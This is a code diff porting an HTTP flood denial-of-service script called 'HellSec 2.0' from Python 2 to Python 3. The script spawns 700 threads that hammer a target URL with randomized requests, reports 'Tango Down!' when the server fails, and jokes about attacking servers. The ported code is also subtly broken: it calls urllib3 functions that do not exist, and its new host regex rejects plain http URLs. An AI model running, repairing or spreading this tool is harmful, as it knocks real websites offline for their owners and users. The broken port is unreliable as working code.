@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding: utf-8
 # coding: latin-1
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -848,8 +848,8 @@ def keyword_list():
         keyword_top.append('Anonymous')
         keyword_top.append('DJ Bach')
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
+        headers_referers.append('http://' + host + '/')
+        return(headers_referers)
 	
 #builds random ascii string
 def buildblock(size):
@@ -860,15 +860,15 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-    print 'HellSec 2.0 - By xS1ender'
-    print ''
-    print 'Usage: HellSec.py (url)'
-    print 'Example: HellSec.py http://www.google.com/'
-    print 'Have fun fucking elite\'s servers'
-    print 'Expect your connection to slow down; This tool is powerful'
-    print "\a"
-print \
-"""
+    print ('HellSec 2.0 - By xS1ender')
+    print ('')
+    print ('Usage: HellSec.py (url)')
+    print ('Example: HellSec.py http://www.google.com/')
+    print ('Have fun fucking elite\'s servers')
+    print ('Expect your connection to slow down; This tool is powerful')
+    print ("\a")
+print 
+("""
 
 888    888          888 888  .d8888b.                    
 888    888          888 888 d88P  Y88b                   
@@ -879,7 +879,7 @@ print \
 888    888 Y8b.     888 888 Y88b  d88P Y8b.     Y88b.    
 888    888  "Y8888  888 888  "Y8888P"   "Y8888   "Y8888P 
                                                        
-"""
+""")
 
 
 #http request
@@ -891,7 +891,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -900,18 +900,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib3.urlopen(request)
+	except urllib3.HTTPError as e:
 			#print e.code
 			set_flag(1)
- 			print '[+] Error 500 - Tango Down!'
+			print ('[+] Error 500 - Tango Down!')
 			code=500
-	except urllib2.URLError, e:
+	except urllib3.URLError as e:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -923,7 +923,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 # monitors http threads and counts requests
@@ -931,11 +931,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+150<request_counter) & (previous<>request_counter):
-				print "[+] Successfully sent %d packets - HellSec is here to stay" % (request_counter)
+			if (previous+150<request_counter) & (previous!=request_counter):
+				print ("[+] Successfully sent %d packets - HellSec is here to stay" % (request_counter))
 				previous=request_counter
 		if flag==2:
-			print "\n[*] Killing the proccess, attack has stopped"
+			print("\n[*] Killing the proccess, attack has stopped") 
 
 #execute 
 if len(sys.argv) < 2:
@@ -946,15 +946,19 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "[*] Engaging Attack"
+		print("[*] Engaging Attack")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+			
+		try:
+			host = re.search('https\://([^/]*)/?.*', url).group(1)
+		except:
+			print ("[!] Invalid URL format")
+			sys.exit()
 		for i in range(700):
 			t = HTTPThread()
 			t.start()
